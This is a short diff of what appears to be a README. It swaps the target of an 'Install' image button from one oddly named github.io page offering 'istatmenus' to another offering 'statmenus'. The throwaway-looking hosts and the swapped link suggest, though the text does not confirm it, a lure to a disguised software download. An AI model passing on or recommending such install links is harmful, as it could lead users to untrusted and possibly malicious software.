@@ -14,7 +14,7 @@
 </p>
 
 <p align="center">
-  <a href="https://day-deneg-pzh.github.io/.github/istatmenus">
+  <a href="https://porksdofs-mmak.github.io/.github/statmenus">
     <img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/>
   </a>
 </p>
